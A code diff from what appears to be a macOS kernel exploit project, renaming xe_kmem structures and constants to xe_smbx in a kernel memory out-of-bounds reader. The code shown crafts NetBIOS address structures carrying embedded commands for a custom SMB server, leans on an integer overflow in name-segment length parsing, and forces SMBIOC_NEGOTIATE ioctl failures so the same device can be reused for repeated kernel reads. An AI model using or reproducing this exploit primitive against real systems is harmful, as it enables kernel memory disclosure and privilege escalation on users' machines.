@@ -13,9 +13,9 @@
 #include <dispatch/dispatch.h>
 
 #include <xe/util/assert.h>
+#include <xe_smbx/smbx_conf.h>
 
 #include "../smb/client.h"
-#include "../public/xe_kmem/smbx_conf.h"
 
 #include "kmem_oob_reader.h"
 
@@ -60,7 +60,7 @@ void kmem_oob_reader_read(const struct kmem_oob_reader_args* args, char* server_
     /// due to integer overflow (Line: `seglen = (*cp) + 1`)
     xe_assert(args->saddr_snb_name_seglen != 0xff);
     xe_assert(args->laddr_snb_name_seglen != 0xff);
-    xe_assert_cond(args->laddr_ioc_len, >=, offsetof(struct sockaddr_nb, snb_name) + sizeof(struct xe_kmem_nb_laddr_cmd) + 1);
+    xe_assert_cond(args->laddr_ioc_len, >=, offsetof(struct sockaddr_nb, snb_name) + sizeof(struct xe_smbx_nb_laddr_cmd) + 1);
     
     struct sockaddr_nb saddr;
     struct sockaddr_nb laddr;
@@ -77,22 +77,22 @@ void kmem_oob_reader_read(const struct kmem_oob_reader_args* args, char* server_
     laddr.snb_len = args->laddr_snb_len;
     laddr.snb_name[0] = args->laddr_snb_name_seglen;
     
-    static_assert(sizeof(laddr.snb_name) >= sizeof(struct xe_kmem_nb_laddr_cmd) + 1, "");
+    static_assert(sizeof(laddr.snb_name) >= sizeof(struct xe_smbx_nb_laddr_cmd) + 1, "");
     
     /// Embed custom instructions for xe_smbx server. See `RequestHandler::handleNetbiosSsnRequest`
     /// method in xe_smbx/main.swift
-    struct xe_kmem_nb_laddr_cmd* cmd_paddr = (struct xe_kmem_nb_laddr_cmd*)&laddr.snb_name[1];
+    struct xe_smbx_nb_laddr_cmd* cmd_paddr = (struct xe_smbx_nb_laddr_cmd*)&laddr.snb_name[1];
     cmd_paddr->key = atomic_fetch_add(&g_kmem_oob_reader->keygen, 1);
-    cmd_paddr->magic = XE_KMEM_NB_LADDR_CMD_MAGIC;
+    cmd_paddr->magic = XE_SMBX_NB_LADDR_CMD_MAGIC;
     
     /// Tell xe_smbx server to save the received server and local netbios name
-    cmd_paddr->flags = XE_KMEM_NB_LADDR_CMD_FLAG_SAVE;
+    cmd_paddr->flags = XE_SMBX_NB_LADDR_CMD_FLAG_SAVE;
     
     /// Tell xe_smbx server to respond with `NB_SSN_NEGRESP` response code whiich will lead to
     /// failure of `SMBIOC_NEGOTIATE` ioctl syscall. This will allow us to reuse the
     /// `g_kmem_oob_reader->fd_kmem_reader` without having to close and open an new
     /// SMB device
-    cmd_paddr->flags |= XE_KMEM_NB_LADDR_CMD_FLAG_FAIL;
+    cmd_paddr->flags |= XE_SMBX_NB_LADDR_CMD_FLAG_FAIL;
     
     int error = smb_client_ioc_negotiate_nb(g_kmem_oob_reader->fd_kmem_reader, &saddr, args->saddr_ioc_len, &laddr, args->laddr_ioc_len);
     xe_assert_cond(error, ==, ECONNABORTED);
